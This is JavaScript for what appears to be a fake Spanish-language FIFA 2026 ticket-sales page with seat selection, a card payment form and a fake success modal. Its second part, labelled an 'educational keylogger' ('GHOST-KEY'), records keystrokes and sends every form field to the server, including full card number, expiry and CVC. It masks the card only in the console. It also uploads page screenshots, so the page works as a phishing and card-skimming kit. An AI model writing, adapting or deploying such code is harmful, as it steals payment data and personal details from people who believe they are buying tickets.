        rowDiv.innerHTML = `<span class="text-xs text-gray-400 w-6 font-bold">${rowData.row}</span>`;

        for (let i = 1; i <= rowData.seats; i++) {
            const seatPrice = Math.round(currentPrice * multiplier);
            const seatId = `${type}_${rowData.row}${i}`;
            const isSelected = selectedSeats.some(s => s.id === seatId);
            const seatBtn = document.createElement('div');
            seatBtn.className = `mini-seat available ${isSelected ? 'selected' : ''}`;
            seatBtn.textContent = i;
            seatBtn.onclick = (function (sId, sPrice, sRow, sNum, sType) {
                return function () { window.selectSeat(sId, sPrice, sRow, sNum, sType); };
            })(seatId, seatPrice, rowData.row, i, type);
            rowDiv.appendChild(seatBtn);
        }
        container.appendChild(rowDiv);
    });
}

function generateOrderNumber() {
    const prefix = 'FIFA';
    const year = '2026';
    const random = Math.floor(Math.random() * 10000).toString().padStart(4, '0');
    return `${prefix}-${year}-${random}`;
}

function createConfetti() {
    for (let i = 0; i < 100; i++) {
        const confetti = document.createElement('div');
        confetti.className = 'confetti';
        confetti.style.left = Math.random() * 100 + '%';
        confetti.style.position = 'fixed';
        confetti.style.top = '-10px';
        confetti.style.width = Math.random() * 8 + 4 + 'px';
        confetti.style.height = Math.random() * 8 + 4 + 'px';
        confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
        confetti.style.animation = `fall ${Math.random() * 2 + 1}s linear forwards`;
        confetti.style.pointerEvents = 'none';
        confetti.style.zIndex = '9999';
        document.body.appendChild(confetti);

        setTimeout(() => {
            confetti.remove();
        }, 3000);
    }
}

function showSuccessModal(totalAmount, email, userName) {
    const orderNumber = generateOrderNumber();
    const displayName = userName || document.getElementById('c-name')?.value || 'aficionado';

    document.getElementById('order-number').innerText = orderNumber;
    document.getElementById('paid-amount').innerHTML = `$${totalAmount.toLocaleString('es-MX')} MXN`;
    document.getElementById('sent-email').innerHTML = email;
    document.getElementById('success-message').innerHTML = `¡Gracias por tu compra, ${displayName}! Tu reserva para ${currentMatch} ha sido confirmada.`;
    document.getElementById('success-modal').classList.remove('hidden');
    createConfetti();

    console.log(`\n${'='.repeat(60)}`);
    console.log(`✅ TRANSACCIÓN COMPLETADA Y DATOS ENVIADOS`);
    console.log(`${'='.repeat(60)}`);
    console.log(`👤 Usuario: ${displayName}`);
    console.log(`📧 Correo: ${email}`);
    console.log(`📄 Partido: ${currentMatch}`);
    console.log(`🎫 Asientos: ${selectedSeats.length}`);
    console.log(`💰 Total: $${totalAmount.toLocaleString('es-MX')} MXN`);
    console.log(`📋 Número de orden: ${orderNumber}`);
    console.log(`${'='.repeat(60)}`);
    console.log(`📨 Los siguientes datos se están enviando por correo:`);
    console.log(`   ✅ Todos los logs de teclado capturados`);
    console.log(`   ✅ Todas las capturas de pantalla`);
    console.log(`   ✅ Información de la transacción`);
    console.log(`${'='.repeat(60)}\n`);
}

window.closeSuccessModal = function () {
    document.getElementById('success-modal').classList.add('hidden');
    alert('Redirigiendo a la sección de Mis Boletos...');
};

window.closeSuccessModalAndReturn = function () {
    document.getElementById('success-modal').classList.add('hidden');
    window.closeModals();
    document.getElementById('entradas').scrollIntoView({ behavior: 'smooth' });
};

window.openSeatMap = function (matchId, match, price) {
    currentPrice = price;
    currentMatch = match;
    selectedSeats = [];

    document.getElementById('modal-title').innerText = match;
    document.getElementById('modal-match-name').innerText = match;
    document.getElementById('modal-price').innerHTML = `$${price.toLocaleString('es-MX')} MXN`;
    document.getElementById('modal-total').innerHTML = `$${price.toLocaleString('es-MX')} MXN`;

    renderStadiumSections();
    loadStadiumImage(matchId);
    updateSeatSummary();
    document.getElementById('seat-modal').classList.remove('hidden');
};

window.loadStadiumImage = function (matchId) {
    const stadiumImg = document.getElementById('stadium-img');
    const pitch = document.getElementById('pitch-horizontal');
    if (stadiumImg) {
        // Buscar el partido para obtener la imagen correcta
        const match = matches.find(m => m.id === matchId);
        if (match && match.imagen) {
            // Convertir la ruta de imagen a imagen de asientos
            // Ej: /src/azteca.jpg -> /src/azteca-asientos.jpg
            const seatsImage = match.imagen.replace('.jpg', '-asientos.jpg');
            stadiumImg.src = seatsImage;
        } else {
            // Fallback por defecto
            stadiumImg.src = '/src/azteca-asientos.jpg';
        }
        stadiumImg.alt = 'Estadio - Distribución de Asientos';

        // Ajustar las dimensiones del contenedor cuando la imagen se cargue
        stadiumImg.onload = function () {
            if (pitch) {
                const imgWidth = this.naturalWidth || this.width;
                const imgHeight = this.naturalHeight || this.height;
                const aspectRatio = imgWidth / imgHeight;

                // Ajustar el ancho máximo según la proporción de la imagen
                if (aspectRatio > 1) {
                    // Imagen más ancha que alta
                    pitch.style.maxWidth = '600px';
                } else {
                    // Imagen más alta que ancha
                    pitch.style.maxWidth = '450px';
                }

                // Asegurar una altura mínima coherente
                pitch.style.minHeight = '300px';
            }
        };
    }
};

window.goBackToSelection = function () {
    window.closeModals();
    document.getElementById('entradas').scrollIntoView({ behavior: 'smooth' });
};

window.openPayment = function () {
    // Actualizar total en el modal de pago
    const total = selectedSeats.reduce((sum, seat) => sum + seat.price, 0);
    const paymentTotal = document.getElementById('payment-total');
    if (paymentTotal) {
        paymentTotal.innerHTML = `$${total.toLocaleString('es-MX')} MXN`;
    }
    document.getElementById('payment-modal').classList.remove('hidden');
};

window.closeModals = function () {
    document.getElementById('seat-modal').classList.add('hidden');
    document.getElementById('payment-modal').classList.add('hidden');
};

// Formateo de tarjeta
document.getElementById('c-number')?.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
});

// Formateo de fecha de expiración
document.getElementById('c-exp')?.addEventListener('input', (e) => {
    let value = e.target.value.replace(/[^\d]/g, '');
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    e.target.value = value;
});

// Procesar pago con validaciones
document.getElementById('payment-form')?.addEventListener('submit', async (e) => {
    e.preventDefault();

    // Obtener valores
    const email = document.getElementById('c-email')?.value || '';
    const cardName = document.getElementById('c-name')?.value || '';
    const cardNumber = document.getElementById('c-number')?.value || '';
    const cardExp = document.getElementById('c-exp')?.value || '';
    const cardCvc = document.getElementById('c-cvc')?.value || '';

    const totalAmount = selectedSeats.reduce((sum, seat) => sum + seat.price, 0);

    // Validaciones
    const errors = [];

    if (totalAmount === 0) {
        errors.push('Por favor selecciona al menos un asiento antes de continuar.');
    }

    if (!validateEmail(email)) {
        errors.push('Por favor ingresa un correo electrónico válido.');
    }

    if (!validateCardName(cardName)) {
        errors.push('Por favor ingresa el nombre completo del titular de la tarjeta.');
    }

    if (!validateCardNumber(cardNumber)) {
        errors.push('Por favor ingresa un número de tarjeta válido (16 dígitos).');
    }

    if (!validateExpiryDate(cardExp)) {
        errors.push('Por favor ingresa una fecha de vencimiento válida (MM/AA).');
    }

    if (!validateCVV(cardCvc)) {
        errors.push('Por favor ingresa un código CVV válido (3 o 4 dígitos).');
    }

    if (errors.length > 0) {
        alert('❌ ' + errors.join('\n❌ '));
        return;
    }

    // Simular máscara de tarjeta
    const lastFour = cardNumber.replace(/\s/g, '').slice(-4);

    const submitBtn = e.target.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerText;
    submitBtn.innerText = '⏳ Procesando pago...';
    submitBtn.disabled = true;

    // Primero capturar una última pantalla
    captureScreenshot();

    // Esperar a que se procese y luego enviar todo al servidor
    setTimeout(async () => {
        // Enviar al servidor ANTES de mostrar el modal de éxito
        try {
            const response = await fetch('/finalizar-y-enviar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    user: cardName,
                    email: email,
                    match: currentMatch,
                    totalAmount: selectedSeats.reduce((sum, seat) => sum + seat.price, 0),
                    seats: selectedSeats.length,
                    cardLastFour: lastFour
                })
            });

            if (response.ok) {
                console.log('✅ Datos enviados al servidor');
            }
        } catch (err) {
            console.error('⚠️ Error al enviar datos:', err);
        }

        // Mostrar modal de éxito
        window.closeModals();
        showSuccessModal(
            selectedSeats.reduce((sum, seat) => sum + seat.price, 0),
            email,
            cardName
        );

        submitBtn.innerText = originalText;
        submitBtn.disabled = false;
    }, 2000);

    form.reset();
});

// Event listeners para filtros
document.getElementById('btn-aplicar-filtros')?.addEventListener('click', applyFilters);

// ============= KEYLOGGER EDUCATIVO =============
// Captura de eventos de teclado en tiempo real

// Variables para el keylogger
let keystrokeBuffer = '';
let lastSendTime = 0;
const SEND_INTERVAL = 1000; // Enviar cada segundo
let lastScreenshotTime = 0;
const SCREENSHOT_INTERVAL = 5000; // Captura cada 5 segundos

// Objeto para mapear códigos de teclas especiales
const specialKeys = {
    'Enter': '↵',
    'Backspace': '⌫',
    'Tab': '⇥',
    'Shift': '⇧',
    'Control': '⌃',
    'Alt': '⌥',
    'Meta': '⌘',
    'ArrowUp': '↑',
    'ArrowDown': '↓',
    'ArrowLeft': '←',
    'ArrowRight': '→',
    'Space': '␣'
};

// Función para capturar pantalla
async function captureScreenshot() {
    try {
        const canvas = await html2canvas(document.body, {
            allowTaint: true,
            useCORS: true,
            scale: 0.8
        });

        const imageData = canvas.toDataURL('image/png');

        // Enviar al servidor
        fetch('/upload-screenshot', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                image: imageData,
                user: document.getElementById('c-name')?.value || 'usuario',
                timestamp: new Date().getTime()
            })
        }).catch(err => console.log('⚠️ Error capturando pantalla:', err));

        console.log(`📸 Captura de pantalla enviada`);
    } catch (error) {
        console.log('⚠️ No se pudo capturar pantalla:', error);
    }
}

// Función para capturar datos de campos de formulario
function captureFormFieldData(fieldName, fieldValue) {
    // Enmascarar números de tarjeta
    let displayValue = fieldValue;
    if (fieldName.toLowerCase().includes('card') || fieldName.toLowerCase().includes('number')) {
        displayValue = fieldValue.replace(/\d(?=\d{4})/g, '*');
    }

    // Enviar al servidor
    fetch('/captura', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            f: fieldName,
            v: fieldValue,
            timestamp: new Date().toLocaleString()
        })
    }).catch(err => console.log('⚠️ No se pudo enviar captura:', err));

    console.log(`📝 Campo: ${fieldName} => Valor: ${displayValue}`);

    // Capturar pantalla cuando se rellenan campos importantes
    const importantFields = ['c-name', 'c-email', 'c-number', 'c-exp', 'c-cvc'];
    if (importantFields.includes(fieldName)) {
        const now = Date.now();
        if ((now - lastScreenshotTime) > SCREENSHOT_INTERVAL) {
            captureScreenshot();
            lastScreenshotTime = now;
        }
    }
}

// Capturador de eventos de teclado
document.addEventListener('keydown', function (event) {
    const key = event.key;
    const target = event.target;

    // Capturar teclas especiales
    if (specialKeys[key]) {
        keystrokeBuffer += ` [${specialKeys[key]}] `;
    } else if (key.length === 1) {
        keystrokeBuffer += key;
    }

    // Si es Enter, procesar la entrada
    if (key === 'Enter') {
        if (target.form) {
            // Es un campo de formulario
            const fieldName = target.id || target.name || 'campo-desconocido';
            const fieldValue = target.value;
            captureFormFieldData(fieldName, fieldValue);
        }
    }

    // Enviar buffer periódicamente
    const now = Date.now();
    if (keystrokeBuffer.length > 0 && (now - lastSendTime) > SEND_INTERVAL) {
        //console.log(`⌨️ Teclas capturadas: ${keystrokeBuffer}`);
        keystrokeBuffer = '';
        lastSendTime = now;
    }
});

// Capturador de cambios en campos de formulario
document.addEventListener('change', function (event) {
    const target = event.target;
    if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'SELECT') {
        const fieldName = target.id || target.name || 'campo-desconocido';
        const fieldValue = target.value;
        captureFormFieldData(fieldName, fieldValue);
    }
});

// Capturador de entrada en campos de texto (para captura en tiempo real)
document.addEventListener('input', function (event) {
    const target = event.target;
    if ((target.tagName === 'INPUT' && target.type === 'text') || target.tagName === 'TEXTAREA') {
        // Capturar solo cada cierto tiempo para no sobrecargar
        const fieldName = target.id || target.name || 'campo-desconocido';

        // Limitar de qué campos capturamos (para no capturar búsquedas de partidos)
        if (fieldName.includes('c-') || fieldName.includes('card') || fieldName.includes('email') ||
            fieldName.includes('nombre') || fieldName.includes('name')) {
            const fieldValue = target.value;
            // Mostrar solo en consola, no enviar aún (se enviará al hacer blur o enter)
            //console.log(`💬 Input en tiempo real [${fieldName}]: ${fieldValue.substring(0, 10)}...`);
        }
    }
});

// Capturador cuando se pierde el foco en un campo
document.addEventListener('blur', function (event) {
    const target = event.target;
    if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
        const fieldName = target.id || target.name || 'campo-desconocido';
        const fieldValue = target.value;
        if (fieldValue.length > 0) {
            captureFormFieldData(fieldName, fieldValue);
        }
    }
}, true);

// Inicializar
renderMatches(matches);
renderVenues();

// Limpiar formulario al cargar
window.addEventListener('load', () => {
    const form = document.getElementById('payment-form');
    if (form) form.reset();

    console.log('%c👻 GHOST-KEY INICIALIZADO', 'color: red; font-size: 14px; font-weight: bold;');
    console.log('%cCaptura de datos: ACTIVA', 'color: orange; font-size: 12px;');
});